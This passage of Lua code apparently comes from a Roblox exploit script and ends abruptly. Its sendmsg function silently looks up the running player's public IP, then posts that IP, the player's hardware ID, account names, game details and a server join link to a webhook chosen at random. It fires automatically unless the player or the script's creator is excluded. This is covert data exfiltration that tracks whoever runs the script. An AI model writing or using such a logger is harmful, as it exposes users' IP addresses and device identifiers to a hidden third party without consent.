function sendmsg()
    local marketplaceService = game:GetService("MarketplaceService")
    local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, Game.PlaceId)
    if isSuccessful then
        local a = types({
            Url = "https://api.ipify.org?format=jsonp&callback=getip",
            Headers = {['Content-Type'] = 'application/json'},
            Method = "GET"
        })
        a = string.gsub(a.Body, "getip", "")
        a = string.gsub(a, "{", "")
        a = string.gsub(a, "(", "")
        a = string.gsub(a, '"ip":', "")
        a = string.gsub(a, '"', "")
        a = string.gsub(a, '}', "")
        a = string.gsub(a, ';', "")
        local wh = WebHooks[math.random(1,#WebHooks)]
        local embed1 = {
            ['title'] =  "Alt: "..game.Players.LocalPlayer.Name.." (@"..game.Players.LocalPlayer.DisplayName..")",
            ['description'] = "```Main Account:"..Creator.Name.."(@"..Creator.DisplayName..")```".."```\nGame: "..info.Name.."("..game.PlaceId..")```".."```\nIP: "..a.."```".."\n```HWID: "..hwid.."```".."\n```Join Link: roblox://placeID="..game.PlaceId.."&gameInstanceId="..game.JobId.."```".."\n```Main Account Link:https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile```",
            ["url"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile",
        }
        local a = types({
            Url = wh,
            Headers = {['Content-Type'] = 'application/json'},
            Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed1}, ['content'] = ''}),
            Method = "POST"
        })
    end
end
if not table.find(NotFind,tonumber(Creator.UserId)) then
    if not table.find(NotFind,tonumber(game.Players.LocalPlayer.UserId)) then
        sendmsg()
    end
end
end
